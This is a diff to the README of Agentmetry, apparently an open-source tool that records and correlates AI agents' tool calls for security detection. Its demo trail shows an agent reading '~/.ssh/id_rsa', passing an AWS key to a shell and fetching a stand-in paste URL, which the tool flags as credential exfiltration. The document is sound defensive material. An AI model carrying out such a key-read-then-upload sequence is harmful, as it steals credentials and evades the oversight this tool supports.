@@ -68,9 +68,11 @@ Runs on your machine. Forward to Loki, Elastic, or Splunk only if you want to.</
 
 When an autonomous agent runs a tool, most stacks keep nothing you could hand to an incident responder. Logs show a process; they do not show **intent**, **session boundaries**, or **what the human approved**.
 
-Agentmetry is the open-source **endpoint flight recorder** for AI agents — built to run entirely on your machine, with optional forwarding to the SIEM you already operate.
+Agentmetry is the open-source **endpoint flight recorder** for AI agents. It runs entirely on your machine, with optional forwarding to the SIEM you already operate.
 
-> an immutable, operator-owned audit trail for governed AI agents — capturing tool execution at the IDE lifecycle boundary and the MCP wire, not in a vendor cloud
+**Observability-first by design.** Agentmetry records and correlates what happened at the tool boundary. It is not a sandbox and not a CASB. Prevention (block mode for DLP and tool policy) is opt-in. The default is **detect and record**: every tool call, denial, and approval lands in a JSONL trail you own, with correlated sequence alerts when individually-innocent calls add up to an attack. That is the layer EDR never had: the agent's session, not just the host process.
+
+> an immutable, operator-owned audit trail for governed AI agents, capturing tool execution at the IDE lifecycle boundary and the MCP wire, not in a vendor cloud
 
 We do that by:
 
@@ -78,9 +80,9 @@ We do that by:
 - **Normalizing** every event into a canonical schema v1.1.0 with MITRE ATT&CK enrichment and SHA-256 argument hashing
 - **Detecting** correlated behavioral sequences a single event cannot reveal (credential exfil, guardrail bypass, download cradles, agent data injection, recon-then-grab)
 - **Scanning** secrets and PII at the hook boundary with a local regex DLP engine (`log` by default; opt-in `block` mode)
-- **Forwarding** the same JSONL trail to Loki, Elastic ECS, Splunk HEC, or a generic webhook — without making the cloud the system of record
+- **Forwarding** the same JSONL trail to Loki, Elastic ECS, Splunk HEC, or a generic webhook, without making the cloud the system of record
 
-**Agentmetry is not a CASB or shadow-AI spy.** It records the agents you wire in. If your problem is unmanaged ChatGPT in the browser, you need network/endpoint policy — not a flight recorder.
+**Agentmetry is not a shadow-AI spy.** It records the agents you wire in. If your problem is unmanaged ChatGPT in the browser, you need network/endpoint policy, not a flight recorder.
 
 ---
 
@@ -101,7 +103,7 @@ python scripts/demo.py
 It replays an agent session through the real ingest API: the agent reads an SSH
 private key, runs a command containing an AWS key, then fetches a URL. Agentmetry
 tags each call with MITRE ATT&CK, catches the AWS key with DLP (storing the rule,
-never the value), and then — without being asked — **correlates the key read with
+never the value), and then **correlates the key read with
 the network call and fires a `CRITICAL` credential-exfil detection.**
 
 <p align="center">
@@ -111,6 +113,31 @@ the network call and fires a `CRITICAL` credential-exfil detection.**
 No single one of those events is an alert. The sequence is. That is the whole
 product in one screen.
 
+### The artifact: JSONL trail vs dashboard
+
+Before you install hooks, here is what you get. The demo above writes a few lines
+to a local JSONL file (`data/audit-forward.jsonl`). Each line is one canonical
+event. None of the tool calls alone is an alert; the detection engine emits a
+**fourth line** when the sequence completes:
+
+```jsonl
+{"correlation_id":"demo-sess","action":{"type":"tool_called","outcome":"success"},"tool":{"qualified":"cursor.Read","command":"cat ~/.ssh/id_rsa","input_hash":"…","mitre":{"tactic_id":"TA0006","technique_id":"T1552.004"}}}
+{"correlation_id":"demo-sess","action":{"type":"tool_called","outcome":"success"},"tool":{"qualified":"cursor.Shell","input_hash":"…"},"dlp":{"rule_id":"aws_access_key","mode":"log","severity":"critical"}}
+{"correlation_id":"demo-sess","action":{"type":"tool_called","outcome":"success"},"tool":{"qualified":"WebFetch","command":"fetch https://paste.example.com/upload","mitre":{"tactic_id":"TA0011","technique_id":"T1071.001"}}}
+{"correlation_id":"demo-sess","action":{"type":"detection","outcome":"critical"},"detection":{"rule_id":"credential-exfil","severity":"critical","summary":"cursor.Read accessed credentials, then WebFetch egressed to the network in the same session.","event_ids":["…","…"]}}
+```
+
+The same session in the dashboard: the detections strip surfaces the CRITICAL
+finding; the event feed links each row back to the trail lines above:
+
+<p align="center">
+  <img src="docs/assets/dashboard-detection.png" alt="Same credential-exfil session in the dashboard: CRITICAL detections strip and highlighted rows in the event feed." width="900">
+</p>
+
+Tool arguments are hashed by default (`input_hash`); DLP records the **rule id**,
+never the secret value. The detection line is also written to your SIEM sinks if
+you configure them, so you do not need the dashboard open to get paged.
+
 ### See the dashboard with a story in it
 
 ```bash
@@ -119,12 +146,9 @@ python scripts/demo_dashboard.py --live     # ...and streams synthetic agent tra
 ```
 
 One command seeds a realistic demo trail and serves the dashboard locally — no
-API key, no cloud. The detections strip surfaces CRITICAL findings; the feed
-shows approval gates, tool calls, and inline detection events:
-
-<p align="center">
-  <img src="docs/assets/dashboard-detection.png" alt="Agentmetry flight recorder with DETECTIONS strip showing CRITICAL credential-exfil alerts and the event feed highlighting detection rows, SSH key reads, and network egress." width="900">
-</p>
+API key, no cloud. Seven sessions, five real detections (computed by the pipeline,
+not hand-written). The feed shows approval gates, tool calls, and inline detection
+events across Event stream, Detections, and Analytics tabs.
 
 See the [dashboard tour](docs/dashboard-tour.md) for what each view shows and how
 to read it.
@@ -365,11 +389,31 @@ Agentmetry is community-built. Browse [open issues](https://github.com/blitzcrie
 
 ## Behavioral Detection Engine
 
-Per-event MITRE tags say *what* a single tool call is. The detection engine says what a **sequence** of calls means — the signal an EDR cannot see because it never had the agent's session boundary.
+Per-event MITRE tags say *what* a single tool call is. The detection engine says what a **sequence** of calls means: the signal an EDR cannot see because it never had the agent's session boundary.
 
-Rules run **as events arrive**. A firing rule is emitted once per session as a first-class canonical event (`action.type: detection`, `action.outcome: <severity>`) down the same sinks as everything else — so it reaches your SIEM, your alert webhook, and the live feed without anyone opening a dashboard. The same findings are recomputed from the trail on `GET /audit/detections/{correlation_id}`.
+Rules run **as events arrive**. A firing rule is emitted once per session as a first-class canonical event (`action.type: detection`, `action.outcome: <severity>`) down the same sinks as everything else, so it reaches your SIEM, your alert webhook, and the live feed without anyone opening a dashboard. The same findings are recomputed from the trail on `GET /audit/detections/{correlation_id}`.
 
-> **Alpha limitation.** Live detection checkpoint state persists in SQLite across orchestrator restarts (emitted rules and session windows are not re-fired). Detection state is still per-process and not shared across multiple orchestrator instances. The JSONL trail stays authoritative — every detection can be recomputed on query via `GET /audit/detections/{correlation_id}`.
+> **Alpha limitation.** Live detection checkpoint state persists in SQLite across orchestrator restarts (emitted rules and session windows are not re-fired). Detection state is still per-process and not shared across multiple orchestrator instances. The JSONL trail stays authoritative; every detection can be recomputed on query via `GET /audit/detections/{correlation_id}`.
+
+### How sequence rules work
+
+No single event in the demo session looks like an incident. The engine waits for an ordered pattern inside one `correlation_id` (one agent session), then emits one detection event:
+
+```mermaid
+flowchart LR
+  E1["1. Read private key<br/>T1552 · normal tool call"]
+  E2["2. Shell with AWS key<br/>DLP log · still no alert"]
+  E3["3. WebFetch URL<br/>TA0011 · still no alert"]
+  ENG["Sequence engine<br/>rules.py"]
+  D["4. detection event<br/>credential-exfil · CRITICAL"]
+
+  E1 --> ENG
+  E2 --> ENG
+  E3 --> ENG
+  ENG --> D
+```
+
+Each rule in the table below is the same idea: **ordered steps within a session**, not a threshold on one row. `credential-exfil` requires credential access (T1552) *then* network egress (TA0011) in that order. Reversed order does not fire.
 
 ```mermaid
 sequenceDiagram
